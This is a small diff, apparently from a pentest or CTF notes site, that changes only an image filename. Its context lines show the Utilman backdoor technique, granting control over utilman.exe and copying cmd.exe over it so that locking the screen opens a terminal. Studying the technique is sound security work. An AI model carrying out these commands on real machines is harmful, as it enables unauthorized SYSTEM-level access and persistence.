@@ -811,7 +811,7 @@ icacls C:\Windows\System32\utilman.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 To trigger our terminal, we will lock our screen from the start button.
 
